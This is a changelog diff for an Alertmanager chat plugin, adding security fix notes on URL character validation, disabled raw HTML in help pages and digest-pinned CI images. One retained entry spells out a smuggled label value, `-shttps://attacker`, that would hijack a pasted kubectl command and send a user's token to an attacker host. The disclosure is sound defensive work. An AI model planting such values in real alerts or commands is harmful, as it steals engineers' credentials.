@@ -15,7 +15,9 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 ### Security
 
 * Quick-diagnostic commands strip leading dashes from label values. A forged alert with `pod="-shttps://attacker"` could otherwise turn a pasted `kubectl get pod -n <ns> <pod>` into `--server https://attacker` and send the engineer's token there.
-* A SiteURL containing characters that break markdown links, Alertmanager templates or quoted YAML (``( ) { } < > ' " ` \``, whitespace, or any non-ASCII such as U+2028) is no longer baked into runbook, icon, help and webhook links. The plugin uses the `CHANGE-ME` placeholder instead and logs a warning once. IPv6 hosts such as `https://[::1]:8065` are still accepted.
+* A SiteURL containing characters that break markdown links, Alertmanager templates or quoted YAML (``( ) { } < > ' " ` \``, whitespace, any non-ASCII such as U+2028, or `?` and `#`) is no longer baked into runbook, icon, help, webhook and inventory links. The plugin uses the `CHANGE-ME` placeholder instead (`/alertmanager about` hides the inventory link) and logs one warning per bad value. IPv6 hosts such as `https://[::1]:8065` are still accepted.
+* The help and runbook pages no longer render raw HTML from their markdown sources. None of the shipped pages used it; the screenshot notes in the quickstart source no longer ship as HTML comments.
+* CI pins the promtool image by digest as well as tag.
 
 ### Bug Fixes
 
